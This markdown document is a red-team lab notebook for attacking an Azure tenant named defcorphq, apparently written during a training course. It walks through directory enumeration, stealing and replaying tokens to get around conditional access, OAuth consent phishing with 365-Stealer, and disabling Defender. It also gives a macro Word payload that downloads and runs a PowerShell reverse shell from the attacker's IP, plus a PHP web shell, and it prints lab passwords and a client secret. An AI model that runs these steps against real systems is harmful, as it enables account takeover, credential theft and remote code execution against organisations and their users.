*_Got creds for a test user by password spray._


- Manual Enumeration
- Stealing Tokens
- Enum tools
- [Consent Abuse](https://github.com/conma293/Azure/blob/main/killcycle.md#consent-abuse)

* * *

TLDR:
- Use [AzureAD](https://github.com/conma293/Azure/blob/main/2.1_Enumeration.md#enumeration---azuread-module)/[MG Module](https://github.com/conma293/Azure/blob/main/2.1_Enumeration.md#enumeration---mg-module) for basic AAD/Entra ID Directory enumeration (i.e., users, groups, devices)
  - This will require an access token for AAD or MS Graph
- Use [az powershell](https://github.com/conma293/Azure/blob/main/2.1_Enumeration.md#enumeration----az-powershell) or [az cli](https://github.com/conma293/Azure/blob/main/2.1_Enumeration.md#enumeration---azure-cli-az-cli) for other enumeration - resources, roles, vms, apps etc
  - This will require ARM access token (default token)
    

- Using tools like ROADTools or [Azurehound](https://github.com/conma293/Azure/blob/main/OAuth.md#enumeration---azurehound) is going to be our best bet anyhow (and enum isnt logged so who cares right!?)
 
    
* * *

#### AzureAD
Using the [AzureAD Module](https://github.com/conma293/Azure/blob/main/2.1_Enumeration.md#enumeration---azuread-module) to begin


We have compromised a user "Test", so first thing after [logging in](https://github.com/conma293/Azure/blob/main/2.1_Enumeration.md#enumeration---azuread-module); lets see what **user permissions** we have - in Azure this will be groups and roles:
```
Get-AzureADUser -SearchString 'test'
Get-AzureADUserMembership -ObjectId test@defcorphq.onmicrosoft.com
```
Can we see much more information about this **group**? ```Get-AzureADGroup -ObjectId 477db607-3447-4fde-b7de-cdbef47321ed | fl *```
**Who** else is in this **group**? (everyone):  ```Get-AzureADGroupMember -ObjectId 477db607-3447-4fde-b7de-cdbef47321ed```


Ok lets look for **admin users**:
```
Get-AzureADUser -SearchString 'admin' | Get-AzureADUserMembership
Get-AzureADUserMembership -ObjectId admin@defcorphq.onmicrosoft.com
```
- I wonder who else is in the Global Admins group? ```Get-AzureADGroupMember -ObjectId 9240b75e-823c-4c02-8868-a00ddbeb3fa1```

_in normal environments we would expect to see some Service Principals (that is an application service account) running as Global Administrator - if we were to compromise that object, or a user that is the owner of that object, we could get GA!_

- Lets check if we are the **owner of a device** (and therefore localadmin)? ```Get-AzureADUserOwnedDevice -ObjectId test@defcorphq.onmicrosoft.com```
- lets see what **devices** are ACTUALLY being **used** (i.e., active): ```Get-AzureADDevice -All $true | ?{$_.ApproximateLastLogonTimeStamp -ne $null}```
- OK now lets see if there are any **custom roles**? ```Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False}``` (May need to use preview module)
- And lets see the **users who have Global admin** role: ```Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember```
#### MG Module
You could also use the [MG Module](https://github.com/conma293/Azure/blob/main/2.1_Enumeration.md#enumeration---mg-module) instead if you wanted:
```
$passwd = ConvertTo-SecureString "V3ryH4rdt0Cr4ckN0OneCr4ckTh!sP@ssw0rd" -AsPlainText -Force 
$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd) 
Connect-AzAccount -Credential $creds 

$Token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Force)
```
```
Get-MgUser -All
Get-MgUser -All | select UserPrincipalName
Get-MgGroup -All
Get-MgDevice
```

To get all the Global Administrators:
```
$RoleId = (Get-MgDirectoryRole -Filter "DisplayName eq 'Global Administrator'").Id
(Get-MgDirectoryRoleMember -DirectoryRoleId $RoleId).AdditionalProperties
```

list all custom directory roles:
```Get-MgRoleManagementDirectoryRoleDefinition | ?{$_.IsBuiltIn -eq $False} | select DisplayName```

#### az powershell
there is also [az Powershell](https://github.com/conma293/Azure/blob/main/2.1_Enumeration.md#enumeration----az-powershell), best for resources, roles and VMs:

- Ok now lets enumerate all **resources** visible to the current user:
```Get-AzResource```

- And enumerate all **Azure RBAC role assignments** for all the resources the current user has read access to (NOT just the users role assignments):
```Get-AzRoleAssignment```

- lets output that to a table for ease of use:
```
Get-AzRoleAssignment | select DisplayName, RoleDefinitionName, ObjectType, CanDelegate
```

- Ok now lets look at **Virtual Machines** the user has access to: ```Get-AzVM | fl *```
- And any **Apps**: ```Get-AzWebApp```
  - We could display just **WebApp/Traditional App**:
```Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}```
  - Display **functional App**:
```Get-AzFunctionApp```
- List a table of all visible apps:
```
Get-AzWebApp | select name, HostNames, kind, state, identity
```
- Also **Storage**:
```Get-AzStorageAccount | fl```
- And **KeyVault**:
 ```Get-AzKeyVault```

#### az cli
And finally [az cli](https://github.com/conma293/Azure/blob/main/2.1_Enumeration.md#enumeration---azure-cli-az-cli); 
a good one to use from az cli is the **whoami** equivalent:-
```az ad signed-in-user show```


Also good to note, there is more information returned from ```az cli``` for some objects i.e., Can see the type of managed identity used for objects such as VM and Webapps:
```
az vm list
az vm list --query "[].[name]" -o table

az webapp list
az webapp list --query "[].[name]" -o table

az functionapp list --query "[].[name]" -o table

az storage account list

az keyvault list
```

Important to try all tools to get info!

## Tokens
- Steal tokens (If you are signed in you can dump it with ```(Get-AzAccessToken).token```)
- reuse instead of creds (similar to TGT ticket reuse with Rubeus):
```
Connect-AzAccount -AccessToken $token -AccountId test@defcorphq.onmicrosoft.com
```

- Test access to resources: ```Get-AzResource```

_with token replay you evade conditional access policy, and almost always mfa and entra id protect as well_
  - (because its not a sign-in!) all those work only for signin, this is after, direct to api - 
```Web API Validates access token and returns secure data to web server app```

lets get graph token:
```
Get-AzAccessToken -ResourceTypeName MSGraph
disConnect-AzAccount
Connect-AzAccount -AccountId test@defcorphq.onmicrosoft.com -AccessToken $token -MicrosoftGraphAccessToken eyJ0eXA...
```

**best target is managed identity access token - not protected by CAE!**


### Steal token
When on a machine look in - ```C:\Users\[username]\.Azure```
 - **az cli** (before 2.30.0 – January 2022) stores access tokens in clear text in ```accessTokens.json```
    - You can modify accessTokens.json to use access tokens with az cli but better to use with Az PowerShell or the Azure AD module.
    - ```azureProfile.json``` in the same directory contains information about subscriptions.
 -  **Az PowerShell** (older versions) stores access tokens in clear text in ```TokenCache.dat```
    -  It also stores ServicePrincipalSecret in clear-text in AzureRmContext.json if a service principal secret is used to authenticate.
 -  Another interesting method is to take a **process dump of PowerShell** and looking for tokens in it!
    -  Users can save tokens using Save-AzContext, look out for them! Search for **Save-AzContext** in PowerShell console history!
    -  ```C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_History.txt```
  




## Tools
#### ROADTools
```
cd C:\AzAD\Tools\ROADTools
.\venv\Scripts\activate
roadrecon auth -u test@defcorphq.onmicrosoft.com -p V3ryH4rdt0Cr4ckN0OneCr4ckTh!sP@ssw0rd
roadrecon gather
roadrecon gui
```


```roadrecon plugin policies``` writes to ```C:\AzAD\Tools\ROADTools```

#### AzureHound
```
$passwd = ConvertTo-SecureString "V3ryH4rdt0Cr4ckN0OneCr4ckTh!sP@ssw0rd" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("test@defcorphq.onmicrosoft.com", $passwd)

Connect-AzAccount -Credential $creds

Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
Connect-AzureAD -Credential $creds

. C:\AzAD\Tools\AzureHound\AzureHound.ps1
Invoke-AzureHound -Verbose
```

Run ```C:\AzAD\Tools\BloodHound-win32-x64\BloodHound-win32-x64```

matches :
```MATCH (n) WHERE n.azname IS NOT NULL AND n.azname <> "" AND n.name IS NULL SET n.name = n.azname```

## Consent Abuse
1. register a tenant (dont need credit card)
2. register app in newly created tenant
3. we set consent permissions we want to steal
4. we send a phishing link (ms online link)
5. User clicks on phish, grants consent
6. Users access token to graph API sent to attacker controlled app 
7. Now we can use that access token to access graph API as the phished user (limited to the permissions the user consented to)

NOTE - logs for application consent include permissions - VERBOSE LOG 

First lets check if users can even consent
```
$passwd = ConvertTo-SecureString "V3ryH4rdt0Cr4ckN0OneCr4ckTh!sP@ssw0rd" -AsPlainText -Force 
$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd) 
Connect-AzAccount -Credential $creds
$Token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
```

Azure AD Graph:
```
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole 
ManagePermissionGrantsForSelf.microsoft-user-default-legacy
```

OR MS Graph:
```
Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Force)
(Get-MgPolicyAuthorizationPolicy).DefaultUserRolePermissions.PermissionGrantPoliciesAssigned
```
#### Tricky way to get phishing url

goto ```https://localhost/``` and click readmore - take url from address bar which is a good redirect template:
```
https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=c0e39a5f-266c-4425-b6cf-d55350b868dc&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default+openid+offline_access+&redirect_uri=https%3A%2F%2F172.16.152.213%2Flogin%2Fauthorized&response_mode=query&sso_reload=true
```

#### find vulnerable website
```
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1 
Invoke-EnumerateAzureSubDomains -Base defcorphq –Verbose
```

#### Step 1 - make the app

- goto portal.azure.com

  - signin as student213@defcorpextcontractors.onmicrosoft.com

- Click Microsoft Entra ID > Manage > App registrations - New registrations
  - Create an app called Student213_App
  - Accounts in Multitenant
  - Redirect URI (Web) to our attacker VM - https://172.16.151.213/login/authorized
  - goto certificates and secrets and create a Client Secret - a client secret allows you to access the tenant as an application
    - SAVE CLIENT SECRET!!! - 
```
_Qb8Q~yaLVJW5Y1li3dtzyES8j1fQp7j43xfjctR
```
  - now API Permissions - User.Read is there, lets add some good ones
    - MS Graph, Delegated permissions, User.ReadBasic.All 
    - (have to have admin to be able to consent for Application permissions)

#### Step 2 - ready the handler/listener
We need to ready the attacker VM for incoming redirects that we are going to phish out

- Run xampp to launch webserver
- Copy the '365-Stealer' directory from C:\AzAD\Tools directory to C:\xampp\htdocs
- navigate to:- http://localhost:82/365-stealer/yourVictims
- click on 365 stealer configuration 
  - need to provide the app ID and client secret (from before in the azure portal blade)
  - and:
```
https://172.16.152.213/login/authorized
/
[blank]
[blank]
1
```
- save config
- run 365 stealer
- this has now provided us with the phishing URL we need for later:
```
https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=9e10a3bc-7cfa-407c-8ec9-8b04a3f2cd45&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default+openid+offline_access+&redirect_uri=https%3A%2F%2F172.16.151.213%2Flogin%2Fauthorized&response_mode=query
```


#### Step 3 - Send the phish
```
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1 
Invoke-EnumerateAzureSubDomains -Base defcorphq –Verbose
```
/.default - whatever is specified in permissions consent
query mode so its easier for us to pass the output

- navigate to contact form to upload phish 
- ```defcorphqcareer.azurewebsites.net```
- need help section
- put phishing link in the reference link field
- shared/group mailboxes are a mess, no one has sole resposibility - exploit it 


#### Step 4 - Pass the token

Now with the token in hand we can pass to the API
```
$Token = 'eyJ0eX..'

$URI = 'https://graph.microsoft.com/v1.0/users'

$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}

(Invoke-RestMethod @RequestParams).value
```


#### Step 5 - PrivEsc - now we want Admin Consent

From the returned users we have identified an admin - if we can phish an admin we can get an admin consent

- add more delegated permissions to the app
  - ```mail.read```, ```notes.read.all```, ```mailboxsettings.readwrite```, ```files.readwrite.all```, ```mail.send```
- email markdwalden@defcorphq.onmicrosoft.com 
- look at token in https://jwt.io
- using the 365Stealer webapp GUI (and the consented permissions) we can upload a file to their onedrive
- create macro infected wordfile with a revshell back to attackers machine
```
$passwd = ConvertTo-SecureString "ForCreatingWordDocs@123" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("office-vm\administrator", $passwd)
$officeVM = New-PSSession -ComputerName 172.16.1.250 -Credential $creds 

Enter-PSSession -Session $officeVM 
```

- Now in the remote session:
```Set-MpPreference -DisableRealtimeMonitoring $true```

- Now, host the script Out-Word on your student VM by copying it to the C:\xampp\htdocs directory and use the below command in the PSRemoting session to load it on the office VM:
```
iex (New-Object Net.Webclient).downloadstring("http://172.16.152.213:82/Out-Word.ps1")
```

- create the word doc:
```
Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadstring('http://172.16.152.213:82/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.152.213 -Port 4444" -OutputFile studentx.doc
```

- copy it back to your machine:
```
Copy-Item -FromSession $officeVM -Path C:\Users\Administrator\Documents\studentx.doc -Destination C:\AzAD\Tools\studentx.doc
```

Now, start a listener on your student VM to catch the reverse shell: 

```
C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444 
listening on [any] 4444 ...
```
###App Service
now lets upload hilarious shell:-
```
<?php 

system($_REQUEST['cmd']);

?>
```
Now we can navigate to:
```
https://defcorphqcareer.azurewebsites.net/uploads/studentxshell.phtml?cmd=env
```

and then:
```
https://defcorphqcareer.azurewebsites.net/uploads/studentxtoken.phtml
```
